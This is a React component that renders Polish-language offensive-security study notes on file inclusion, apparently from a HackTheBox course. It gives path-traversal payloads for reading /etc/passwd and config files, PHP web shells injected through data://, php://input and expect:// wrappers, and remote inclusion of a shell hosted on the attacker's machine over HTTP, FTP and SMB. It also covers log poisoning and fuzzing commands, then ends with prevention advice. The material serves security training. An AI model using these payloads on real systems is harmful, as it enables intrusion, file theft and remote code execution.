import { Link } from 'react-router-dom';
import file_inclusion_example from '../../../assets/file_inclusion_example.png';
import file_inclusion_example_2 from '../../../assets/file_inclusion_example_2.png';
import file_inclusion_poison_log from '../../../assets/file_inclusion_poison_log.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const FileInclusion = () =>{
    return(
        <section>
            <h1>File Inclusion</h1>
            <p>Najważniejszą rzeczą, o której należy pamiętać, jest to, że <span className="important">niektóre z funkcji odczytują tylko zawartość określonych plików, inne natomiast wykonują określone pliki. Co więcej, niektóre z nich umożliwiają określenie zdalnych adresów URL, podczas gdy inne działają tylko z plikami lokalnymi na serwerze zaplecza</span>. Poniższa tabela pokazuje, które funkcje mogą wykonywać pliki, a które tylko odczytują zawartość pliku:</p>
       
            <table class="table table-striped text-left">
                <thead>
                    <tr>
                    <th>Funkcja</th>
                    <th>Czytanie kontentu</th>
                    <th>Wykonywanie</th>
                    <th>Zdalny URL</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><span className="waring">PHP</span></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    </tr>
                    <tr>
                    <td>include()/include_once()</td>
                    <td align="center">✅</td>
                    <td align="center">✅</td>
                    <td align="center">✅</td>
                    </tr>
                    <tr>
                    <td><code>require()</code>/<code>require_once()</code></td>
                    <td align="center">✅</td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    </tr>
                    <tr>
                    <td><code>file_get_contents()</code></td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    <td align="center">✅</td>
                    </tr>
                    <tr>
                    <td><code>fopen()</code>/<code>file()</code></td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    <td align="center">❌</td>
                    </tr>
                    <tr>
                    <td><span className="waring">NodeJS</span></td>
                    <td align="center"></td>
                    <td align="center"></td>
                    <td align="center"></td>
                    </tr>
                    <tr>
                    <td><code>fs.readFile()</code></td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    <td align="center">❌</td>
                    </tr>
                    <tr>
                    <td><code>fs.sendFile()</code></td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    <td align="center">❌</td>
                    </tr>
                    <tr>
                    <td><code>res.render()</code></td>
                    <td align="center">✅</td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    </tr>
                    <tr>
                    <td><span className="waring">Java</span></td>
                    <td align="center"></td>
                    <td align="center"></td>
                    <td align="center"></td>
                    </tr>
                    <tr>
                    <td><code>include</code></td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    <td align="center">❌</td>
                    </tr>
                    <tr>
                    <td><code>import</code></td>
                    <td align="center">✅</td>
                    <td align="center">✅</td>
                    <td align="center">✅</td>
                    </tr>
                    <tr>
                    <td><span className="waring">.NET</span></td>
                    <td align="center"></td>
                    <td align="center"></td>
                    <td align="center"></td>
                    </tr>
                    <tr>
                    <td><code>@Html.Partial()</code></td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    <td align="center">❌</td>
                    </tr>
                    <tr>
                    <td><code>@Html.RemotePartial()</code></td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    <td align="center">✅</td>
                    </tr>
                    <tr>
                    <td><code>Response.WriteFile()</code></td>
                    <td align="center">✅</td>
                    <td align="center">❌</td>
                    <td align="center">❌</td>
                    </tr>
                    <tr>
                    <td><code>include</code></td>
                    <td align="center">✅</td>
                    <td align="center">✅</td>
                    <td align="center">✅</td>
                    </tr>
                </tbody>
            </table>

            <h2>LFI Local File Inclusion</h2>
            <ExampleFrame screen={file_inclusion_example} />
            <ExampleFrame screen={file_inclusion_example_2} />
            <p>Może zarówno ścieżka relatywna jak i absolutna działać w zależności jak zaimplementowany jest kod</p>

            <hr />
            <h2>Podstawowe obejścia</h2>
        
            <p>Zmodyfikowanie wstrzyknięcia poprzez podwojenie znaków w zapytaniu</p>
            <div className='waring'>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>....//....//....//....//etc/passwd</span></p>
            </div>

            <p>Część filtrów może uniemożliwić wpisywanie znaków w linku w tym przypadku możemy zastosować Encoding <span className='important'> ../ na %2e%2e%2f</span></p>

            <div className='waring'>
                <p>Uwaga: aby to zadziałało, musimy zakodować w adresie URL wszystkie znaki, łącznie z kropkami. Niektóre kodery URL mogą nie kodować kropek, ponieważ są one uważane za część schematu adresu URL.</p>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</span></p>
            </div>

            <h3>Zatwierdzone ścieżki</h3>
            <p>Niektóre aplikacje internetowe mogą także używać wyrażeń regularnych, aby mieć pewność, że dołączany plik znajduje się w określonej ścieżce. Na przykład aplikacja internetowa, z którą mieliśmy do czynienia, może akceptować tylko ścieżki znajdujące się w katalogu <span className='important'>./languages</span> ​​w następujący sposób:</p>
            <div>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>./languages/../../../../etc/passwd</span></p>
            </div>

            <hr />
            <h2>Przestarzałe sposoby</h2>
            <p>Istnieje kilka innych technik, których możemy użyć, ale są one przestarzałe w przypadku nowoczesnych wersji PHP i <span className='important'>działają tylko z wersjami PHP starszymi niż 5.3/5.4</span>. Jednakże wspomnienie o nich może być korzystne, ponieważ niektóre aplikacje internetowe mogą nadal działać na starszych serwerach, a te techniki mogą stanowić jedyne możliwe obejścia.</p>
        
            <p>We wcześniejszych wersjach PHP zdefiniowane ciągi znaków miały maksymalną <span className='important'>długość 4096 znaków</span>. Jeśli zostanie przekazany dłuższy ciąg, zostanie on po prostu obcięty, a wszelkie znaki przekraczające maksymalną długość zostaną zignorowane. Co więcej, PHP używało również do <span className='important'>usuwania końcowych ukośników i pojedynczych kropek w nazwach ścieżek</span><span className='important'>UWAGA: Aby ta technika zadziałała, musielibyśmy również rozpocząć ścieżkę od nieistniejącego katalogu.</span></p>
            <div className='waring'>
                <p>?language=<span className='important'>non_existing_directory</span>/../../../etc/passwd/./././.<span className='important'>[./ Powtóżone ~2048 razy]</span></p>
                <p>PrzemysławF@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {`1..2048`}; do echo -n "./"; done</p>
                <p><span className='important'>non_existing_directory/../../../etc/passwd/./././{`<SNIP>`}././././</span></p>
            </div>

            <hr />
            <h2>Bajty zerowe</h2>
            <p>Wersje <span className='important'>PHP starsze niż 5.5</span> były podatne na wstrzyknięcie bajtu zerowego, co oznacza, że ​​dodanie bajtu zerowego (<span className='important'>%00</span>) na końcu łańcucha powodowało zakończenie łańcucha i nie uwzględniało niczego po nim.</p>
            <p>Aby wykorzystać tę lukę, możemy zakończyć nasz ładunek bajtem zerowym (<span className='important'>np. /etc/passwd%00</span>), tak aby ostateczna ścieżka przekazana do funkcji include() miała postać (<span className='important'>/etc/passwd%00.php</span>). W ten sposób, mimo że do naszego łańcucha zostanie dołączony plik .php, wszystko po bajcie zerowym zostanie obcięte, a zatem użyta ścieżka będzie w rzeczywistości stanowić /etc/passwd, co doprowadzi nas do ominięcia dołączonego rozszerzenia.</p>
            
            <hr />
            <h2>Odczytywanie plików</h2>
            <p>Zacznijmy od fuzzowania by odnaleźć pliki w aplikacji</p>
            <div className='waring'>
                <p>ffuf -w /SecLists/directory-list-2.3-small.txt:FUZZ -u http://{`<SERVER_IP>:<PORT>`}/FUZZ.php</p>
                <p>Result: <span className='important'>config</span></p>
            </div>
            <div className='waring'>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>php://filter/read=convert.base64-encode/resource=config</span></p>
            </div>

            <div>
                <p>Wskazówka: kopiując ciąg zakodowany w formacie <span className='important'>base64</span>, pamiętaj, aby skopiować cały ciąg, w przeciwnym razie nie zostanie on w pełni zdekodowany. Możesz wyświetlić źródło strony, aby upewnić się, że skopiowałeś cały ciąg</p>
            </div>

            <hr />
            <h2>Oczytywanie konfiguracji serwera</h2>
            <p>PHP znajdujący się w (<span className='important'>/etc/php/X.Y/apache2/php.ini</span>) dla Apache lub w (<span className='important'>/etc/php/X.Y/fpm/php.ini</span>) dla Nginx, gdzie <span className='important'>X.Y to Twoja zainstalowana wersja PHP</span>. Użyjemy również filtra <span className='important'>base64</span>, ponieważ pliki .ini są podobne do plików .php i powinny być kodowane, aby uniknąć złamania.</p>
            <div className='waring'>
                <p>curl "http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini</span>"</p>
                <br />
                <p>{`<!DOCTYPE html>`}</p>
                <br />
                <p>{`<html lang="en">`}</p>
                <p>{`...SNIP...`}</p>
                <p>{`<h2>Containers</h2>`}</p>
                <p className='tab-1'><span className='important'>{`W1BIUF0KCjs7Ozs7Ozs7O`}</span></p>
                <p className='tab-1'><span className='important'>{`...SNIP...`}</span></p>
                <p className='tab-1'><span className='important'>{`4KO2ZmaS5wcmVsb2FkPQo=`}</span></p>
                <p>{`<p class="read-more">`}</p>
            </div>

            <p>Kiedy już mamy ciąg zakodowany w <span className='important'>base64</span>, możemy go zdekodować i grepować dla <span className='important'>allow_url_include</span>, aby zobaczyć jego wartość:</p>
            <div className='waring'>
                <p>echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include</p>
                <br />
                <p><span className='important'>allow_url_include = On</span></p>
            </div>
            <p>Opcja jest domyślnie <span className='important'>wyłączona</span>. Często zdarza się, że ta opcja jest włączona, ponieważ wiele aplikacji internetowych opiera się na jej prawidłowym działaniu, jak na przykład <span className='important'>niektóre wtyczki i motywy WordPress</span>.</p>
            <p>Teraz możemy przekazać kod PHP poprzez wartość <span className='important'>data</span></p>

            <div className='waring'>
                <p>echo '{'<'}?php system($_GET["cmd"]); ?{'>'}' | base64</p>
                <br />
                <p><span className='important'>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==</span></p>
            </div>

            <p>Teraz możemy zakodować w adresie URL ciąg base64 (<span className='important'>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D</span>), a następnie przekazać go do opakowania danych za pomocą <span className='important'>data://text/plain;base64</span>,. Wreszcie możemy użyć poleceń przekazywania do powłoki internetowej za pomocą <span className='important'>{`&cmd=<COMMAND>`}</span>:</p>

            <div className='waring'>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>data://text/plain;base64,</span><span className='error'>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D</span><span className='important'>&</span><span className='error'>cmd=id</span></p>
                <br />
                <p>Lub</p>
                <br />
                <p>curl -s http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>data://text/plain;base64,</span><span className='error'>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D</span><span className='important'>&</span><span className='error'>cmd=id</span></p>
                <p><span className='important'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></p>
            </div>

            <h3>Input</h3>
            <p>Różnica między nim a opakowaniem danych polega na tym, że przekazujemy dane wejściowe do opakowania <span className='important'>input</span> jako dane żądania <span>POST</span>. Zatem parametr podatny na ataki musi akceptować żądania POST, aby ten atak zadziałał</p>

            <div className='waring'>
                <p>curl -s -X POST --data <span className='important'>'{'<'}?php system($_GET["cmd"]); ?{'>'}'</span> "http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>php://</span><span className='error'>input</span><span className='important'>&cmd=id</span>" | grep uid</p>
                <p><span className='important'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></p>
            </div>

            <div className='waring'>
                <p>Uwaga: Aby przekazać nasze polecenie jako żądanie <span className='important'>GET</span>, potrzebujemy, aby podatna na ataki funkcja również zaakceptowała żądanie GET (tj. użyj <span className='important'>$_REQUEST</span>). Jeśli akceptuje tylko żądania POST, możemy umieścić nasze polecenie bezpośrednio w naszym kodzie PHP, zamiast dynamicznej powłoki internetowej (np. <span className='important'>{'<'}?php system('id'); ?{'>'}</span>)</p>
            </div>

            <h3>Expect</h3>

            <p>Możemy określić, czy jest on zainstalowany na serwerze zaplecza, tak jak to zrobiliśmy wcześniej w przypadku <span className='important'>allow_url_include</span>, ale zamiast tego wczytalibyśmy <span className='important'>grep expect</span>, a jeśli jest zainstalowany i włączony, otrzymamy następujące informacje:</p>

            <div className='waring'>
                <p>echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep <span className='important'>expect</span></p>
                <br />
                <p><span className='important'>extension=expect</span></p>
            </div>
            <p>Aby skorzystać z modułu <span className='important'>expect</span>, możemy użyć opakowania <span className='important'>expect://</span>, a następnie przekazać polecenie, które chcemy wykonać, w następujący sposób:</p>

            <div className='waring'>
                <p>curl -s "http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>expect://</span><span className='error'>id</span>"</p>
                <br />
                <p>uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
            </div>

            <p>UWAGA: Również użycie modułu <span className='important'>expect</span> z lukami <span className='important'>XXE</span></p>

            <hr />
            <h2>Remote File Inclusion (RFI)</h2>

            <p>Na początku zawsze powinniśmy zaczynać od próby dołączenia <span className='important'>lokalnego adresu URL</span>, aby mieć pewność, że nasza próba <span className='error'>nie zostanie zablokowana przez zaporę sieciową lub inne zabezpieczenia</span>. Użyjmy więc (<span className='important'>http://127.0.0.1:80/index.php</span>) jako naszego ciągu wejściowego i zobaczmy, czy zostanie uwzględniony:</p>
        
            <div className='waring'>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>http://127.0.0.1:80/index.php</span></p>
            </div>

            <div className='waring'>
                <p>Uwaga: uwzględnienie <span className='important'>samej podatnej strony (np. pliku Index.php)</span> może nie być idealnym rozwiązaniem, ponieważ może to spowodować <span className='important'>rekursywną pętlę</span> włączania i spowodować <span className='important'>DoS na serwerze zaplecza</span>.</p>
            </div>

            <hr />
            <h2>Wykonanie zdalnego kodu przez RFI</h2>

            <div className='waring'>
                <p>echo '{'<'}?php system($_GET["cmd"]); ?{'>'}' {`>`} shell.php</p>
            </div>

            <div className='waring'>
                <p>Dobrym pomysłem jest nasłuchiwanie na <span className='important'>wspólnym porcie HTTP</span>, takim jak 80 lub 443, ponieważ porty te mogą zostać umieszczone na <span className='important'>białej liście</span> w przypadku, gdy aplikacja internetowa zawierająca lukę ma zaporę sieciową uniemożliwiającą połączenia wychodzące</p>
            </div>

            <div className='waring'>
                <p>sudo python3 -m http.server {`<LISTENING_PORT>`}</p>
            </div>

            <div className='waring'>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>{`http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`}</span></p>
            </div>

            <h3>FTP</h3>

            <div className='waring'>
                <p>sudo python -m pyftpdlib -p 21</p>
            </div>

            <p>Może to być również przydatne w przypadku, gdy porty <span className='important'>http są blokowane przez zaporę ogniową lub ciąg http:// jest blokowany przez WAF</span>. Aby dołączyć nasz skrypt, możemy powtórzyć to, co zrobiliśmy wcześniej, ale użyj schematu <span className='important'>ftp://</span> w adresie URL w następujący sposób:</p>

            <div className='waring'>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='error'>ftp</span><span className='important'>://{`<OUR_IP>`}/shell.php&cmd=id</span></p>
                <br />
                <p>lub</p>
                <br />
                <p>curl 'http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>ftp://user:pass@localhost/shell.php&cmd=id</span>'</p>
            </div>

            <h3>SMB</h3>
            
            <p>Jeśli podatna na ataki aplikacja internetowa jest hostowana na serwerze <span className='important'>Windows</span> (co możemy stwierdzić na podstawie wersji serwera w nagłówkach odpowiedzi HTTP), wówczas nie potrzebujemy włączania ustawienia <span className='important'>allow_url_include</span> w celu wykorzystania RFI, ponieważ możemy wykorzystać protokół <span className='important'>SMB</span> do zdalne dołączenie pliku. Dzieje się tak, ponieważ system Windows traktuje pliki na zdalnych serwerach SMB jak zwykłe pliki, do których można się bezpośrednio odwoływać za pomocą ścieżki UNC.</p>

            <div className='waring'>
                <p>impacket-smbserver -smb2support share $(pwd)</p>
            </div>
            <div className='waring'>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>\\{`<OUR_IP>`}\share\shell.php&cmd=whoami</span></p>
            </div>

            <hr />
            <h2>Zatrucie logów serwera</h2>
            
            <p>Zarówno <span className='important'>Apache</span>, jak i <span className='important'>Nginx</span> przechowują różne pliki dziennika, takie jak <span className='important'>access.log</span> i <span className='important'>error.log</span></p>
            <p>Plik <span className='important'>access.log</span> zawiera różne informacje o wszystkich żądaniach wysyłanych do serwera, w tym <span className='important'>nagłówek każdego żądania User-Agent</span>. Ponieważ możemy kontrolować nagłówek <span className='important'>User-Agent</span> w naszych żądaniach, możemy go użyć do zatrucia dzienników serwera</p>
            <p>Dzienniki <span className='imporant'>Nginx</span> są domyślnie czytelne dla użytkowników z <span className='important'>niskimi uprawnieniami (np. www-data)</span>, podczas gdy dzienniki <span className='important'>Apache</span> są czytelne tylko dla użytkowników z <span className='important'>wysokimi uprawnieniami (np. grupy root/adm)</span>. Jednak na starszych lub <span className='important'>źle skonfigurowanych serwerach Apache</span> dzienniki te mogą być czytelne dla użytkowników o <span className='important'>niskich uprawnieniach</span>.</p>
        
            <div className='waring'>
                <p>Domyślnie dzienniki <span className='important'>Apache</span> znajdują się w <span className='important'>/var/log/apache2/</span> w systemie <span className='important'>Linux</span> i w <span className='important'>C:\xampp\apache\logs\</span> w systemie <span className='important'>Windows</span>, natomiast dzienniki <span className='important'>Nginx</span> znajdują się w <span className='important'>/var/log/nginx/</span> w systemie <span className='important'>Linux</span> i w <span className='important'>C:\nginx\log\</span> w systemie <span className='important'>Windows</span>. Jednak w niektórych przypadkach dzienniki mogą znajdować się w innej lokalizacji</p>
            </div>
        
            <div className='waring'>
                <p>http://{`<SERVER_IP>:<PORT>`}/index.php?language=<span className='important'>/var/log/apache2/access.log</span></p>
            </div>

            <div className='waring'>
                <p>Wskazówka: dzienniki są zazwyczaj ogromne i załadowanie ich ze względu na lukę w zabezpieczeniach LFI może zająć trochę czasu, a w najgorszych przypadkach nawet spowodować <span className='error'>awarię serwera</span>. Dlatego należy zachować <span className='error'>ostrożność i wydajność, korzystając z nich w środowisku produkcyjnym i nie wysyłać niepotrzebnych żądań.</span></p>
            </div>

            <ExampleFrame screen={file_inclusion_poison_log} />
            <div className='waring'>
                <p>Można również zatruć za pomocą komendy: </p>
                <p>curl -s "http://{`<SERVER_IP>:<PORT>`}/index.php" -A "{`<`}?php system($_GET['cmd']); ?{`>`}"</p>
            </div>

            <div className='waring'>
                <p>Wskazówka: nagłówek <span className='important'>User-Agent</span> jest także wyświetlany w plikach procesów w <span className='important'>katalogu Linux /proc/</span>. Możemy więc spróbować dołączyć pliki <span className='important'>/proc/self/environ lub /proc/self/fd/N</span> (<span className='important'>gdzie N to PID zwykle z zakresu 0-50</span>) i być może uda nam się przeprowadzić ten sam atak na te pliki. Może się to przydać w przypadku, gdy nie mamy dostępu do odczytu logów serwera, jednak pliki te mogą być <span className='important'>odczytywane tylko przez uprzywilejowanych użytkowników</span>.</p>
            </div>
            <p>Inne dzienniki usług do których mamy dostęp:</p>
            <ul>
                <li className='important'>/var/log/sshd.log</li>
                <li className='important'>/var/log/mail</li>
                <li className='important'>/var/log/vsftpd.log</li>
            </ul>

            <hr />
            <h2>Automatyczne skanowanie</h2>

            <div className='waring'>
                <p><span className='important'>Fuzzowanie parametrów</span></p>
                <p>ffuf -w /SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://{`<SERVER_IP>:<PORT>`}/index.php?FUZZ=value'</p>
            </div>
            <div className='waring'>
                <p><span className='important'>Fuzzowanie LFI</span></p>
                <p>ffuf -w /SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://{`<SERVER_IP>:<PORT>`}/index.php?language=FUZZ'</p>
            </div>
            <div className='waring'>
                <p><span className='important'>Fuzzowanie plików serwera</span></p>
                <p><span className='important'>SecLists/Discovery/Web-Content/default-web-root-directory-windows.txt - windows</span></p>
                <p><span className='important'>SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt - linux</span></p>
                <p><span className='important'>SecLists/Fuzzing/LFI/LFI-Jhaddix.txt - również warto użyć</span></p>
                <p>ffuf -w /SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://{`<SERVER_IP>:<PORT>`}/index.php?language=../../../../FUZZ/index.php'</p>
            </div>
            <div className='waring'>
                <p><span className='important'>Fuzzowanie logów/ konfiguracji serwera</span></p>
                <p><span className='important'><Link to="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">Lista lokalizacji</Link> - Windows</span></p>
                <p><span className='important'><Link to="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">Lista lokalizacji</Link> - linux</span></p>
                <p><span className='important'>SecLists/Fuzzing/LFI/LFI-Jhaddix.txt - również warto użyć</span></p>
                <p>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://{`<SERVER_IP>:<PORT>`}/index.php?language=../../../../FUZZ'</p>
            </div>

            <hr />
            <h2 className='defense'>Zapobieganie</h2>
            <p className='defense'>Najskuteczniejszą rzeczą, jaką możemy zrobić, aby zmniejszyć luki w zabezpieczeniach związane z dołączaniem plików, jest unikanie przekazywania jakichkolwiek danych wejściowych kontrolowanych przez użytkownika do jakichkolwiek funkcji włączania plików lub interfejsów API. Strona powinna mieć możliwość dynamicznego ładowania zasobów na zapleczu, bez jakiejkolwiek interakcji z użytkownikiem. </p>
            <p className='defense'>skorzystać z ograniczonej białej listy dozwolonych danych wejściowych użytkownika i dopasować każde wejście do pliku, który ma zostać załadowany, mając jednocześnie wartość domyślną dla wszystkich pozostałych danych wejściowych. Jeśli mamy do czynienia z istniejącą aplikacją internetową, możemy utworzyć białą listę zawierającą wszystkie istniejące ścieżki używane w interfejsie, a następnie wykorzystać tę listę w celu dopasowania danych wprowadzonych przez użytkownika. </p>
            <h3 className='defense'>Zapobieganie przeglądaniu katalogów</h3>
            <p className='defense'>Najlepszym sposobem zapobiegania przeglądaniu katalogów jest użycie wbudowanego narzędzia języka programowania (lub frameworka) do pobrania tylko nazwy pliku.</p>
            <p className='defense'>Można również zastosować kilka konfiguracji, aby zmniejszyć wpływ luk w zabezpieczeniach związanych z dołączaniem plików w przypadku ich wystąpienia. Na przykład powinniśmy globalnie wyłączyć dołączanie plików zdalnych. W PHP można to zrobić, <span className='important'>allow_url_fopen i allow_url_include</span> na Wyłączone.</p>
            <p className='defense'>Blokowanie plików niezwiązanych z siecią (poza folderem aplikacji). Najczęstszym sposobem jest uruchomienie aplikacji w Dockerze</p>
            <h3 className='defense'>Web Application Firewall (WAF)</h3>
            <p className='defense'>Uniwersalnym sposobem wzmacniania aplikacji jest wykorzystanie zapory aplikacji internetowych (WAF), takiej jak ModSecurity. W przypadku WAF najważniejszą rzeczą, której należy unikać, są fałszywe alarmy i blokowanie niezłośliwych żądań. ModSecurity minimalizuje fałszywe alarmy, oferując tryb zezwalający, który raportuje tylko te rzeczy, które by zablokował. Dzięki temu obrońcy mogą dostosować reguły, aby mieć pewność, że żadne uzasadnione żądanie nie zostanie zablokowane. Nawet jeśli organizacja nigdy nie chce przełączać WAF w „tryb blokowania”, samo ustawienie go w trybie zezwalającym może być wczesnym sygnałem ostrzegawczym, że Twoja aplikacja jest atakowana.</p>
        </section>
    )
}

export default FileInclusion;